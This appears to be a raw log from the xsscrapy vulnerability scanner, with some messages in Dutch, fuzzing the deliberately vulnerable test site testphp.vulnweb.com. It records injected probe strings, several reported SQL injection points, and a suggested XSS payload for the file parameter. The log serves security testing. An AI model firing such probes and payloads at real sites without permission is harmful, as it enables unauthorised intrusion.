+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/1zqjit'%22()%7B%7D%3Cx%3E:1zqjit;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php/1zqjtp'%22()%7B%7D%3Cx%3E:1zqjtp;9/?pic=7
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/> (referer: 1zqjzy'"(){}<x>:/1zqjzy;9)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php?pic=1zqjwp'%22()%7B%7D%3Cx%3E:/1zqjwp;9
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/1zqjec'%22()%7B%7D%3Cx%3E:1zqjec;9. type = url, end of url
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded form param addcart to: http://testphp.vulnweb.com/cart.php
+2022-06-21 14:33:13 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html/1zqjaw'%22()%7B%7D%3Cx%3E:1zqjaw;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html> (referer: 1zqjlb'"(){}<x>:/1zqjlb;9)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded form param price to: http://testphp.vulnweb.com/cart.php
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html. type = header, cookie
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php/1zqjil'%22()%7B%7D%3Cx%3E:1zqjil;9/?file=./pictures/7.jpg
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/1zqjit'%22()%7B%7D%3Cx%3E:1zqjit;9. type = url, end of url
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html/1zqjwb'%22()%7B%7D%3Cx%3E:1zqjwb;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php?file=1zqjdz'%22()%7B%7D%3Cx%3E:/1zqjdz;9
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/1zqjkg'%22()%7B%7D%3Cx%3E:1zqjkg;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/)
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/. type = header, cookie
+
+
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/> (referer: 1zqjze'"(){}<x>:/1zqjze;9)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/. type = header, cookie
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html> (referer: 1zqjlk'"(){}<x>:/1zqjlk;9)
+2022-06-21 14:33:14 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html/1zqjwb'%22()%7B%7D%3Cx%3E:1zqjwb;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/> (referer: 1zqjjv'"(){}<x>:/1zqjjv;9)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php/1zqjjq'%22()%7B%7D%3Cx%3E:1zqjjq;9/?cat=2
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/. type = header, cookie
+
+
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/1zqjkg'%22()%7B%7D%3Cx%3E:1zqjkg;9. type = url, end of url
+
+
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=5> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjhc'%22()%7B%7D%3Cx%3E:/1zqjhc;9
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html. type = header, cookie
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=4> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=3> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=2> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php/1zqjpq'%22()%7B%7D%3Cx%3E:1zqjpq;9/?pic=5
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php?pic=1zqjdf'%22()%7B%7D%3Cx%3E:/1zqjdf;9
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php/1zqjug'%22()%7B%7D%3Cx%3E:1zqjug;9/?pic=4
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php/1zqjkj'%22()%7B%7D%3Cx%3E:1zqjkj;9/?pic=3
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php?pic=1zqjak'%22()%7B%7D%3Cx%3E:/1zqjak;9
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/listproducts.php/1zqjld'%22()%7B%7D%3Cx%3E:1zqjld;9/?cat=1> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=1> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=1zqjgr'%22()%7B%7D%3Cx%3E:/1zqjgr;9> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php/1zqjxz'%22()%7B%7D%3Cx%3E:1zqjxz;9/?pic=2
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php?pic=1zqjtk'%22()%7B%7D%3Cx%3E:/1zqjtk;9
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=1zqjge'%22()%7B%7D%3Cx%3E:/1zqjge;9> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php/1zqjec'%22()%7B%7D%3Cx%3E:1zqjec;9/?file=./pictures/1.jpg
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/showimage.php/1zqjbn'%22()%7B%7D%3Cx%3E:1zqjbn;9/?file=./pictures/6.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php?file=1zqjys'%22()%7B%7D%3Cx%3E:/1zqjys;9
+2022-06-21 14:33:14 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/listproducts.php/1zqjld'%22()%7B%7D%3Cx%3E:1zqjld;9/?cat=1>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg> (referer: 1zqjey'"(){}<x>:/1zqjey;9)
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=1. type = header, cookie
+
+
+2022-06-21 14:33:14 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2022-06-21 14:33:14 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjgr'%22()%7B%7D%3Cx%3E:/1zqjgr;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:14 [xsscrapy] INFO:     Payload: 1zqjgr'"(){}<x>:/1zqjgr;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:14 [xsscrapy] INFO:     Injectiepunten: cat
+2022-06-21 14:33:14 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: SQL syntax.*MySQL
+2022-06-21 14:33:14 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2022-06-21 14:33:14 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjgr'%22()%7B%7D%3Cx%3E:/1zqjgr;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/
+2022-06-21 14:33:14 [xsscrapy] INFO:     Payload: 1zqjgr'"(){}<x>:/1zqjgr;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:14 [xsscrapy] INFO:     Injectiepunten: cat
+2022-06-21 14:33:14 [xsscrapy] INFO:     Line: 	error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ''"(){}<x>:/1zqjgr;9' at line 1
+2022-06-21 14:33:14 [xsscrapy] INFO:     Fout: Payload delims do not surround this injection point. Found via search for entire payload.
+2022-06-21 14:33:14 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/listproducts.php?cat=1zqjgr'%22()%7B%7D%3Cx%3E:/1zqjgr;9>
+
+
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=1> (referer: 1zqjgm'"(){}<x>:/1zqjgm;9)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php/1zqjjf'%22()%7B%7D%3Cx%3E:1zqjjf;9/?pic=1
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/product.php/1zqjtp'%22()%7B%7D%3Cx%3E:1zqjtp;9/?pic=7> (referer: http://testphp.vulnweb.com/product.php?pic=7)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php?pic=1zqjzx'%22()%7B%7D%3Cx%3E:/1zqjzx;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg
+2022-06-21 14:33:14 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/showimage.php?file=1zqjge'%22()%7B%7D%3Cx%3E:/1zqjge;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:14 [xsscrapy] INFO:     Payload: 1zqjge'"(){}<x>:/1zqjge;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:14 [xsscrapy] INFO:     Injectiepunten: file
+2022-06-21 14:33:14 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:14 [xsscrapy] INFO:     Line: <p
+warning: fopen(1zqjge'"(){}<x>:/1zqjge;9
+2022-06-21 14:33:14 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/showimage.php?file=1zqjge'%22()%7B%7D%3Cx%3E:/1zqjge;9>
+
+
+2022-06-21 14:33:14 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/showimage.php/1zqjbn'%22()%7B%7D%3Cx%3E:1zqjbn;9/?file=./pictures/6.jpg>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg. type = header, cookie
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1zqjwp'%22()%7B%7D%3Cx%3E:/1zqjwp;9> (referer: http://testphp.vulnweb.com/product.php?pic=7)
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/cart.php> (referer: http://testphp.vulnweb.com/product.php?pic=7)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/cart.php> (referer: http://testphp.vulnweb.com/product.php?pic=7)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php/1zqjzh'%22()%7B%7D%3Cx%3E:1zqjzh;9/?file=./pictures/5.jpg
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=1. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/showimage.php/1zqjil'%22()%7B%7D%3Cx%3E:1zqjil;9/?file=./pictures/7.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php?file=1zqjtm'%22()%7B%7D%3Cx%3E:/1zqjtm;9
+2022-06-21 14:33:14 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/product.php/1zqjtp'%22()%7B%7D%3Cx%3E:1zqjtp;9/?pic=7>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=1zqjdz'%22()%7B%7D%3Cx%3E:/1zqjdz;9> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/product.php?pic=7
+2022-06-21 14:33:14 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/product.php?pic=1zqjwp'%22()%7B%7D%3Cx%3E:/1zqjwp;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:14 [xsscrapy] INFO:     Payload: 1zqjwp'"(){}<x>:/1zqjwp;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:14 [xsscrapy] INFO:     Injectiepunten: pic
+2022-06-21 14:33:14 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1zqjwp'%22()%7B%7D%3Cx%3E:/1zqjwp;9. type = url, pic
+
+
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/cart.php. type = form, addcart
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg> (referer: 1zqjsa'"(){}<x>:/1zqjsa;9)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/cart.php. type = form, price
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=7> (referer: http://testphp.vulnweb.com/product.php?pic=7)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/showimage.php/1zqjil'%22()%7B%7D%3Cx%3E:1zqjil;9/?file=./pictures/7.jpg>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=6> (referer: http://testphp.vulnweb.com/listproducts.php?cat=2)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php/1zqjvu'%22()%7B%7D%3Cx%3E:1zqjvu;9/?file=./pictures/2.jpg
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=7> (referer: 1zqjsr'"(){}<x>:/1zqjsr;9)
+2022-06-21 14:33:14 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg
+2022-06-21 14:33:14 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/showimage.php?file=1zqjdz'%22()%7B%7D%3Cx%3E:/1zqjdz;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:14 [xsscrapy] INFO:     Payload: 1zqjdz'"(){}<x>:/1zqjdz;9
+2022-06-21 14:33:14 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:14 [xsscrapy] INFO:     Injectiepunten: file
+2022-06-21 14:33:14 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:14 [xsscrapy] INFO:     Line: <p
+warning: fopen(1zqjdz'"(){}<x>:/1zqjdz;9
+2022-06-21 14:33:14 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/showimage.php?file=1zqjdz'%22()%7B%7D%3Cx%3E:/1zqjdz;9>
+
+
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php?file=1zqjij'%22()%7B%7D%3Cx%3E:/1zqjij;9
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/listproducts.php/1zqjjq'%22()%7B%7D%3Cx%3E:1zqjjq;9/?cat=2> (referer: http://testphp.vulnweb.com/listproducts.php?cat=2)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg. type = header, cookie
+
+
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg. type = header, Referer
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=1zqjhc'%22()%7B%7D%3Cx%3E:/1zqjhc;9> (referer: http://testphp.vulnweb.com/listproducts.php?cat=2)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=7. type = header, cookie
+
+
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=2> (referer: http://testphp.vulnweb.com/listproducts.php?cat=2)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=2> (referer: 1zqjei'"(){}<x>:/1zqjei;9)
+2022-06-21 14:33:14 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=7. type = header, Referer
+
+
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php/1zqjck'%22()%7B%7D%3Cx%3E:1zqjck;9/?pic=6
+2022-06-21 14:33:14 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=3> (referer: http://testphp.vulnweb.com/listproducts.php?cat=3)
+2022-06-21 14:33:14 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php?pic=1zqjxd'%22()%7B%7D%3Cx%3E:/1zqjxd;9
+2022-06-21 14:33:14 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/listproducts.php/1zqjjq'%22()%7B%7D%3Cx%3E:1zqjjq;9/?cat=2>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=3> (referer: 1zqjml'"(){}<x>:/1zqjml;9)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=2
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjhc'%22()%7B%7D%3Cx%3E:/1zqjhc;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjhc'"(){}<x>:/1zqjhc;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: cat
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: SQL syntax.*MySQL
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=2
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjhc'%22()%7B%7D%3Cx%3E:/1zqjhc;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjhc'"(){}<x>:/1zqjhc;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: cat
